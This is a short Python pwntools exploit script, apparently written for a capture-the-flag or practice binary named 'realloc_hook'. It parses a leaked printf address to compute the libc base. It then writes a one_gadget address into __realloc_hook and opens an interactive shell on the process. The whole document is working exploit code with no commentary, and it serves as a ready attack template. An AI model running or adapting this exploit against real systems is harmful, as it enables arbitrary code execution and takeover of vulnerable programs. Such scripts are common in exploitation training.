from pwn import *

context.arch = 'amd64'
libc = ELF("./libc.so.6")

r = process('./realloc_hook')

r.recvuntil('@ ')
libc_base = int(r.recvline().strip(), 16) - libc.symbols['printf']
print "libc_base @ ", hex(libc_base)
realloc_hook = libc_base + libc.symbols['__realloc_hook']

one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[2]

r.sendlineafter(':', str(realloc_hook))
r.sendlineafter(':', p64(one_shot))

r.interactive()